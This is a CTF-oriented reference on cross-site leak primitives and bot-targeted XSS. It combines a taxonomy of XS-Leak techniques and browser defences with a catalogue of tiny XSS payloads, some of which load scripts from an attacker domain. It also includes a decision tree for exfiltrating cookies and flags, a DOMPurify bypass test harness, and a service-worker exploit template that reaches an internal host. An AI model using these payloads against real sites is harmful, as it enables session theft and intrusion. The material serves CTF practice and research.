# Modern XS-Leaks + Bot-XSS — Complete Reference

Sources:
- https://github.com/xsleaks/wiki (THE canonical XS-Leak encyclopedia — 86 docs)
- https://github.com/terjanq/Tiny-XSS-Payloads (curated tiny-payload catalog with browser constraint tags)
- https://github.com/c4llmeco4ch/1337UP-2023-Write-Ups (Intigriti 1337UP CTF — only warmup/misc writeups, less useful)

Combined into a single tactical reference. The deskmesh-* references (from your HackNyx CTF session) complement this with empirical findings.

---

## 1. The Cross-Site Oracle mental model

The single most important concept in XS-Leaks (from xsleaks/wiki):

> **Cross-site oracles** answer YES/NO to cleverly prepared questions, in a way visible to the attacker.

Example: to detect if `?query=secret` returns HTTP 200 on `bank.com`:
- Direct read: blocked by same-origin policy.
- **Side channel:** try loading it as `<script src="bank.com/?query=secret">`. The `onload` event fires if 200 (valid script), `onerror` fires if 404. Visible from attacker.

This is the **fundamental abstraction**. Every XS-Leak primitive is a different way to ask "did the request succeed? what came back? what state did it leave?"

**The 3 components of any XS-Leak:**
1. **Detection** — what observable signal distinguishes YES from NO? (timing, error event, count, length, header, redirect target...)
2. **Trigger** — what API lets you make the cross-origin request? (fetch, img, script, iframe, object, embed, navigation, ping, websocket...)
3. **State** — what's the attacker-controlled state that varies per question? (URL, payload, ID, cookie...)

---

## 2. XS-Leak Primitive Taxonomy (the wiki's attack categories)

### A. Error / event primitives — "did the request succeed?"

| Primitive | Signal | Best for |
|-----------|--------|----------|
| **onload/onerror** (script/img/iframe) | Boolean | Detect 200 vs 404 vs network error |
| **error-events** (dedicated wiki doc) | More nuanced errors (CORS, mixed-content, CSP) | Distinguishing fine-grained response types |
| **postMessage broadcasts** | Cross-frame messages | Leaks via iframe postMessage |
| **window.length** (frame counting) | Frame count after loading | Detecting iframe/object/embed creates frame |

### B. Timing primitives — "how long did it take?"

| Primitive | Resolution | Best for |
|-----------|-----------|----------|
| **execution-timing** | Microsecond (via SharedArrayBuffer + workers) | Side-channels on cryptographic ops |
| **performance-api** (`performance.now()`) | Microsecond | Same-origin benchmark |
| **connection-pool** | Pool exhaustion detection | Detect if target URL was pre-loaded (cache) |
| **network-timing** (`performance.getEntriesByType('resource')`) | High | Detect subresource size/timing variance |
| **hybrid-timing** | Combined | Cross-origin with limited info leak |

**Note:** Chrome 2024+ has substantially reduced `performance.now()` resolution for cross-origin. Use SharedArrayBuffer-based workers when you need higher resolution.

### C. Cache primitives — "was this URL cached?"

| Primitive | Signal | Best for |
|-----------|--------|----------|
| **cache-probing** (the wiki's largest doc, 12KB) | Load time differential | Detect if target URL is in shared cache → leak user history |
| **partitioned-cache** | Per-top-level-site cache partition | Modern browsers partition cache by default — many primitives dead |

### D. Navigation primitives — "where did the browser end up?"

| Primitive | Signal | Best for |
|-----------|--------|----------|
| **navigations** (largest wiki doc, 18KB) | `window.open` URL change, history, target attribute | Detect 3xx redirects → info leak in Location header |
| **frame-counting** | `window.frames.length` | Detect if iframe created (object/embed loaded) |
| **window-references** | Direct window handle | Cross-origin access via `window.opener`, `window.parent` |

### E. Element-leak primitives — "what's in the DOM?"

| Primitive | Signal | Best for |
|-----------|--------|----------|
| **element-leaks** | `scrollWidth`, `scrollHeight`, `getBoundingClientRect` | Cross-origin `<img>` / `<video>` natural size detection |
| **css-injection** | Font detection via `@font-face` and unicode-range | Leak text via installed-font detection |
| **css-tricks** | `:visited` leaks, scroll-based, `::selection` | History sniffing (mostly patched but specific vectors remain) |
| **id-attribute** | CSS selector matching | Fragment-based leak via `#id` URL pattern |

### F. State-based primitives — "what changed about the page?"

| Primitive | Signal | Best for |
|-----------|--------|----------|
| **postmessage-broadcasts** | Message events | Cross-frame messaging leaks |
| **historical/content-type** | Response type detection | Detect content-type leaks |
| **historical/download-bar** | Browser UI state | Detect if download triggered (limited) |
| **historical/stateful-browser-features** | Browser state | Autocomplete, history, etc. |

### G. Modern experiments (Chrome 90+)

| Primitive | Signal | Best for |
|-----------|--------|----------|
| **experiments/portals** | `<portal>` element preview | Newest browser API XS-Leak vector |
| **experiments/scroll-to-text-fragment** | `#:~:text=...` URL fragment | TextDetection via fragment selector |
| **lazy-loading** (img loading="lazy") | Layout/paint timing | Detect if image was in viewport |

---

## 3. Defense Bypass Map (which protection kills which primitive)

**From the wiki's defenses docs (partitioned-cache, fetch-metadata, COOP, CORP, COEP, etc.):**

| Defense | What it blocks | What it doesn't block |
|---------|----------------|------------------------|
| **COOP** `same-origin` | Cross-window access via `window.opener`, `window.parent` | Same-site leaks, framing attacks |
| **CORP** `same-origin` | Cross-origin no-cors embed | CORP only applies to no-cors — fetch bypasses |
| **COEP** `require-corp` | All cross-origin embeds (must opt in) | — |
| **Fetch Metadata headers** | Server can reject cross-origin requests based on `Sec-Fetch-Site`, `Sec-Fetch-Mode`, `Sec-Fetch-Dest` | Doesn't help same-origin or GET requests from `<img>`/`<script>` if Sec-Fetch-Dest is allowed |
| **Partitioned cache** (Chrome 86+) | Cross-site cache probing | Same-site still vulnerable |
| **SameSite cookies** (`Lax`) | Cookies on cross-site subresource GET | Cookies on top-level navigation still sent |
| **COOP+COEP** combo | Most cross-origin windows/embed | Resource timing / network still partial |
| **CSP `frame-ancestors`** | Framing | Doesn't block resource loads |
| **CSP `connect-src`** | fetch/XHR/WebSocket | Doesn't block `<img>`/`<script>` if img-src/script-src allow |
| **`Cross-Origin-Opener-Policy: same-origin`** | Window opener access | — |
| **`Cross-Origin-Embedder-Policy: require-corp`** | Embedding without explicit opt-in | — |
| **`Cross-Origin-Resource-Policy: same-origin`** | Cross-origin resource loading | — |
| **PNA / Private Network Access** (Chrome 94+) | Private network fetches from public | HTTP→HTTPS scheme mismatch, public→public same network |

**Critical for CTF: when a challenge says "CSP is `connect-src 'self'`" — that doesn't block `<img>` to your webhook! CSP needs `img-src` directive separately.**

---

## 4. Bot-XSS Payload Catalog (terjanq's Tiny-XSS-Payloads tagged)

**Each payload tagged with what constraint it needs:**

### If you have unsafe-inline + unsafe-eval:
```html
<svg/onload=eval(`'`+URL)>                            <!-- @wcbowling -->
<svg/onload=eval(name)>                              <!-- control name -->
<svg><svg/onload=eval(name)>                         <!-- works inside innerHTML in Chrome -->
<audio/src/onerror=eval(name)>                       <!-- works inside innerHTML NOT in DOM -->
<img/src/onerror=eval(`'`+URL)>                      <!-- works inside innerHTML NOT in DOM -->
```

### If you have unsafe-inline but NO unsafe-eval:
```html
<svg/onload=location=name>                           <!-- navigate to controlled name -->
<iframe/onload=src=top.name>                         <!-- @terjanq -->
<iframe/onload=src=top[0].name+/\\Ǌ.₨/>             <!-- controls length -->
<iframe/onload=src=contentWindow.name+/\\Ǌ.₨/>      <!-- via contentWindow -->
```

### If you have inline-style allowed:
```html
<style/onload=eval(name)>                            <!-- inline style + eval -->
<style/onerror=eval(name)>                           <!-- chrome-only -->
<style/onload=import(/\\Ǌ.₨/)>                       <!-- dynamic import (Firefox innerHTML) -->
```

### If you have scripts allowed:
```html
<base/href=//Ǌ.₨>                                    <!-- requires relative script after injection -->
<script/src=//Ǌ.₨><\/script>
<iframe/srcdoc="<script/src=//Ǌ.₨><\/script>">
<iframe/srcdoc="<svg><script/href=//Ǌ.₨ />">
<svg/onload=import(/\\Ǌ.₨/)>                          <!-- Firefox innerHTML -->
```

### Key insight: `name` is your friend

`window.name` persists across navigations! Set it once on your origin (you control the opener), then any iframe/`<svg onload>` can read `name` — even cross-origin. This is how the canonical terjanq iframe payloads work:
1. Attacker page: `w = window.open('target.com/vuln')` then `w.name = 'xss_payload'`
2. Vulnerable page on target.com: `<iframe onload="src=top.name">` — reads name from opener

### Other useful gadgets:
- `<iframe/onload=eval(`'`+URL)>` — `URL` here means current page URL. If attacker controls the URL (e.g., via fragment or redirect), leaks via eval.
- `\\Ǌ.₨` — obscure non-ASCII hostname tricks that bypass some URL validators. `Ǌ.₨` resolves to an attacker domain.

---

## 5. Bot-XSS CTF Decision Tree (the most actionable part)

When you see a bot-XSS challenge, walk this tree:

```
1. Can you control HTML in the victim's page?
   ├── NO  → Look for DOM clobbering, prototype pollution, or postMessage listener on attacker.
   └── YES ↓

2. What's the CSP?
   ├── strict (script-src 'self' or 'nonce-X') → Need CSP bypass (unsafe JSONP, base tag, script gadgets)
   └── loose (unsafe-inline) → Can inject script directly. Use payloads section 4.

3. What's the DOMPurify config?
   ├── default → banned: `<script>`, `on*` handlers, `javascript:` URLs
   └── custom ALLOWED_TAGS / ALLOWED_ATTR → check what's permitted

4. Can you get script execution?
   ├── YES (inline + eval) → eval() payload, exfil to your webhook
   └── NO (no eval, no scripts allowed) → use DOM clobbering + gadget chain or navigation leak

5. Where's the flag?
   ├── In a cookie (HttpOnly?) → need XSS to read (but HttpOnly blocks document.cookie)
   │   ├── HttpOnly set → need RCE or side-channel leak
   │   └── No HttpOnly → XSS reads document.cookie, exfils
   ├── In an admin-only page → need to navigate bot there, leak via XS-Leak primitive
   │   └── See primitives section 2 for detection signals
   └── In response body that bot sees → Dangling markup to leak, or full XSS

6. Where will your exfil go?
   ├── Your attacker domain → confirm CSP doesn't block (img-src allow, form-action allow)
   ├── Need HTTP (not HTTPS) for fetch-from-private → ngrok free FAILS, use Cloudflare Workers, your VPS, or self-hosted tunnel
   └── Public file host → verify CSP of response — catbox.moe/transfer.sh add `default-src 'self'` blocking exfil
```

---

## 6. Common pitfalls in modern Chrome (verified empirically from deskmesh CTF)

| Claim (from old writeups) | Reality (Chrome 147/149, June 2026) |
|---------------------------|------------------------------------|
| CRLF injection in URL userinfo bypasses CSP | **BLOCKED** Chrome 88+ (early 2021) |
| DOMPurify mXSS via `<noscript>` backtick-script | **PATCHED** in 3.x |
| DOMPurify mXSS via `<selectedcontent>` | **WORKS** in some Chrome versions but inconsistent — verify with headless Chrome |
| SameSite=None cookies work on cross-site fetch | **DEPRECATED** — Chrome 80+ requires SameSite=None; Secure |
| HTTP→HTTPS scheme mismatch blocks fetch | **NOT** for img/script tags (only fetch/XHR strict) |
| `<a ping>` triggers network request on click | **PNA-protected** for private network since Chrome 94 |
| `window.open()` followed by reading cross-origin frame | **Blocked** by COOP same-origin (if set) |

**Always verify on the actual Chrome version the bot uses** — `chromium --version` in the challenge container. A "well-known\" primitive from a 2022 writeup is often stale in 2026.

---

## 7. Workflow checklist for bot-XSS CTF

- [ ] Identify the bot's Chrome version (`chromium --version` or from Dockerfile).
- [ ] Read the challenge source — find HTML sink (comment, ticket text, profile bio) and JS sink (innerHTML, srcdoc, eval).
- [ ] Check CSP header — note `script-src`, `connect-src`, `img-src`, `frame-src` separately.
- [ ] Check DOMPurify config — default? Custom ALLOWED_TAGS?
- [ ] Trace cookie flow — which cookies does bot have? Any HttpOnly? Any SameSite?
- [ ] Map internal services — ports, paths the bot can reach.
- [ ] Verify exfil endpoint — CSP, scheme, network access.
- [ ] Walk decision tree (section 5) — pick primitive.
- [ ] Test primitive LOCALLY with same Chrome version BEFORE submitting to bot.
- [ ] If primitive fails locally, it WILL fail on bot. Don't waste bot visits.
- [ ] Once XSS confirmed, build the leak primitive based on flag location (section 5 step 5).

---

## 8. Pointer index to deep-dive docs

For any primitive, the wiki has a 5-15KB dedicated doc:

- **Timing:** `content/docs/attacks/timing-attacks/{clocks,connection-pool,execution-timing,hybrid-timing,network-timing,performance-api}.md`
- **Cache:** `content/docs/attacks/cache-probing.md` (12KB — exhaustive)
- **Navigations:** `content/docs/attacks/navigations.md` (18KB — the longest, covers window.open, redirects, history)
- **Element leaks:** `content/docs/attacks/element-leaks.md` + `css-injection.md` + `css-tricks.md` (22KB combined)
- **Frame counting:** `content/docs/attacks/frame-counting.md`
- **Error events:** `content/docs/attacks/error-events.md`
- **postMessage:** `content/docs/attacks/postmessage-broadcasts.md`
- **XS-Search (Google's research):** `content/docs/attacks/xs-search.md`
- **Defenses opt-in:** `content/docs/defenses/opt-in/{coop,corp,document-policies,fetch-metadata,same-site-cookies,xfo}.md`
- **Defenses isolation:** `content/docs/defenses/isolation-policies/{framing-isolation,navigation-isolation,resource-isolation,strict-isolation}.md`
- **Defenses secure-defaults:** `content/docs/defenses/secure-defaults/{corb,partitioned-cache,randomized-capacity}.md`

Read the relevant doc WHEN you commit to a primitive. This reference is the navigation index.

---

## 9. Empirical DOMPurify 3.3.1 mXSS Verification Methodology

When DOMPurify is the bootstrap blocker, don't trust the "blocked" claim from old writeups. **Re-verify on the EXACT Chrome version the bot uses** with a clean local setup.

### Setup

```bash
# Download DOMPurify (cdnjs URL is dead as of June 2026; use jsdelivr)
curl -sL -o /tmp/purify.js https://cdn.jsdelivr.net/npm/dompurify@3.3.1/dist/purify.min.js

# Local HTTP server (Python — returns any .html file or /purify.js)
python3 -m http.server 9091 --directory /tmp/test

# Headless Chrome with enough virtual time for fetches to fire
chromium --headless=new --disable-gpu --no-sandbox \
  --disable-dev-shm-usage --virtual-time-budget=10000 \
  "http://127.0.0.1:9091/test.html"
```

### Critical pitfall: `</script>` inside a payload string

If your test HTML has:
```html
<script>
const p = '<noscript><p title="</noscript><img src=x onerror=alert(1)>">';
</script>
```

The HTML parser sees `</noscript>` inside the JS string and closes the `<script>` tag prematurely. The rest of the script (including the DOMPurify call) becomes broken HTML. Your payload won't execute.

**Fix**: build the payload string in JS using `String.fromCharCode(60)` for `<`, etc.:
```js
const lt = String.fromCharCode(60);
const gt = String.fromCharCode(62);
const p = '<noscript><p title="' + lt + '/noscript' + gt + '<img src=x onerror=fetch(\"/X\")' + gt + '">';
```

### Test harness pattern

A reusable test page with explicit beacons so you can verify each payload separately:

```html
<!DOCTYPE html><html><body>
<script src="/purify.js"></script>
<script>
fetch('/TEST_START');
if (typeof DOMPurify === 'undefined') { fetch('/NO_PURIFY'); throw 'no purify'; }
fetch('/HAS_PURIFY');

const lt = String.fromCharCode(60), gt = String.fromCharCode(62);
const payloads = [
  {n: 'noscript_close', p: '<noscript><p title="' + lt + '/noscript' + gt + '<img src=x onerror=fetch(\'/NS\')' + gt + '">'},
  {n: 'xmp_close',      p: '<xmp><p title="' + lt + '/xmp' + gt + '<img src=x onerror=fetch(\'/XMP\')' + gt + '">'},
  // ... add more
];

const container = document.createElement('div');
container.style.cssText = 'position:absolute;left:-9999px';
document.body.appendChild(container);

payloads.forEach(({n, p}) => {
  const clean = DOMPurify.sanitize(p, {RETURN_TRUSTED_TYPE: false});
  fetch('/CLEAN_' + n + '=' + encodeURIComponent(clean));
  const inner = document.createElement('div');
  inner.innerHTML = clean;
  container.appendChild(inner);
});
fetch('/TEST_DONE');
</script></body></html>
```

If `/TEST_START`, `/HAS_PURIFY`, `/TEST_DONE` all fire but `/NS`, `/XMP` etc don't, DOMPurify successfully sanitized each payload. Any payload that DOES fire (e.g., `/NS`) is a confirmed mXSS bypass.

### Verified dead on DOMPurify 3.3.1 default config (Chrome 142, June 2026)

After testing 30+ payloads with the harness above, NONE bypassed DOMPurify 3.3.1 in default config:

| Payload class | Examples | Result |
|--------------|----------|--------|
| **Rawtext element close** | `<noscript><p title="</noscript><img onerror=...>` | `<p title="&lt;/noscript&gt;...">` (entity-escaped, no breakout) |
| **Backtick-script test 102** | `<img src="x\` \`<script>alert(102)</script>\`">` | `<img src="x\` \`&lt;script&gt;...">` (entities in src) |
| **SVG onload** | `<svg/onload=fetch(...)>` | `<svg></svg>` (onload stripped) |
| **SVG foreignObject** | `<svg><foreignObject><div><img onerror=...>` | foreignObject kept, onerror stripped |
| **MathML CDATA** | `<math><mtext><table><mglyph><style><![CDATA[</style><img onerror=...>` | CDATA section escaped |
| **Form action javascript:** | `<form action="javascript:...">` | javascript: stripped from action |
| **Button formaction** | `<button formaction="javascript:...">` | formaction stripped |
| **is attribute clobbering** | `<input name=is value="<img onerror=...>">` | value entity-escaped |
| **Form clobbering** | `<form id=x><math><mtext></form><form id=x><mglyph>...>` | (classic mXSS for DOMPurify <3.3.0) — fixed in 3.3.0+ |

**No public CVE** affects DOMPurify 3.3.1 default config as of June 2026.

### DOMPurify GHSA search strategy

When you need to find a specific bypass (don't trust the "no CVE exists" claim):

```bash
# Search by version + bypass
gh search issues "repo:cure53/DOMPurify 3.3.1" --sort created --order asc
gh search issues "repo:cure53/DOMPurify bypass is:issue" --sort created --order desc

# Check CHANGELOG for security fixes between bundle version and current
gh release list --repo cure53/DOMPurify --limit 20
gh release view 3.3.2 --repo cure53/DOMPurify  # see what got fixed
gh release view 3.3.3 --repo cure53/DOMPurify
```

### DOMPurify config requirement check

Before assuming a bypass is applicable, check whether the challenge uses the relevant config:

```js
DOMPurify.sanitize(dirty, cfg)
//                          ^^^ check cfg!
```

Common configs to check against known CVEs:
- `SAFE_FOR_XML: true` → issue #1203 (rawtext element bypass)
- `SAFE_FOR_TEMPLATES: true` + `CUSTOM_ELEMENT_HANDLING` → CVE-2025-26791 (math/mglyph/style namespace confusion)
- DOMPurify version >= 3.4.4 + `selectedcontent` in default ALLOWED_TAGS → CVE-2026-47423
- `ADD_ATTR` function form → issue #1319 (URI validation bypass)
- `IN_PLACE: true` → DOM Clobbering (3.4.6 fixes)
- DOMPurify version < 3.3.0 → form clobbering mXSS

If the challenge uses `{RETURN_TRUSTED_TYPE: false}` only (no SAFE_FOR_XML, no CUSTOM_ELEMENT_HANDLING, no ADD_ATTR function), the safe-for-3.3.1-default-config assumption holds.

---

## 10. Service Worker Bootstrap Template (for XSS on auth-required same-origin)

When the bootstrap blocker is "need same-origin JS context on an internal app port that requires auth cookie", and you can host a JS file on a public endpoint, use a Service Worker. The SW runs in the page's origin context and can fetch cross-origin with custom headers (subject to CORS).

### When this works
- Bot visits your URL (via `@-userinfo` bypass: `http://127.0.0.1:7000@HOST/xss`)
- Your JS registers a SW on HOST origin
- SW intercepts a navigation request, fetches the internal URL with the X-Desk-Action (or whatever) header
- Browser renders the SW's response as a top-level navigation
- If the response is text/html with XSS payload, it executes in the response's origin (e.g., http://127.0.0.1:7000) — same-origin JS to that origin

### When this FAILS (the gotchas)
- **Mixed content**: page served over HTTP can't load HTTPS image (and vice versa). The exfil beacon must match the page's scheme.
- **CORS on the response**: if the API endpoint doesn't return `Access-Control-Allow-Origin: *`, the fetch response is opaque. For top-level navigation, the body is still rendered as HTML by the browser, but you can't read it from JS.
- **Secure context**: SW requires HTTPS (or localhost). Cloudflared quick tunnel returns 501 on HTTP, not a 30x redirect.
- **Cookies**: SW runs in the page's origin. To use 127.0.0.1 cookies, the SW must be registered on a page from 127.0.0.1:7000 (bootstrap problem). If SW is on HOST origin, it can only send HOST cookies (or no cookies for cross-origin).
- **No public HTTP endpoint**: cloudflared/ngrok free = HTTPS only. Trycloudflare returns 501 on HTTP. webhook.site accepts HTTP but doesn't serve custom HTML without API key.

### Template (when you have a working HTTP public endpoint)

`exploit.html`:
```html
<!DOCTYPE html><html><body><script>
const TICKET_ID = "PLACEHOLDER"; // server-injected
navigator.serviceWorker.register('/sw.js', {scope: '/'}).then(async () => {
  await navigator.serviceWorker.ready;
  if (!navigator.serviceWorker.controller) {
    await new Promise(r => navigator.serviceWorker.addEventListener('controllerchange', r, {once: true}));
    location.reload(); return;
  }
  location.href = '/go?t=' + TICKET_ID;
});
</script></body></html>
```

`sw.js`:
```javascript
self.addEventListener('install', e => self.skipWaiting());
self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));
self.addEventListener('fetch', e => {
  const url = new URL(e.request.url);
  if (url.pathname === '/go') {
    const ticketId = url.searchParams.get('t');
    e.respondWith(
      fetch('http://127.0.0.1:7000/api/tickets/' + ticketId, {
        method: 'GET',
        headers: {'X-Desk-Action': 'view'},
        mode: 'no-cors',  // OPAQUE response — body still rendered as HTML for top-level navigation
        credentials: 'omit',  // can't use 127.0.0.1 cookies from HOST-origin SW
        redirect: 'follow'
      }).catch(err => new Response('Fetch failed: ' + err, {status: 500}))
    );
  }
});
```

### If the response body isn't auto-rendered as HTML

The above only works if the browser treats the SW's `respondWith` result as the navigation response (it does for top-level navigations). If the response Content-Type is honored differently, you'll get a download prompt or a blank page. Verify locally with the SAME Chrome version as the bot.

If the SW response has `X-Content-Type-Options: nosniff` or the API doesn't set the content-type, the browser might guess wrong. The `/api/tickets/<id>` endpoint in deskmesh returns text/html by default (Flask) — good. But other endpoints might not.
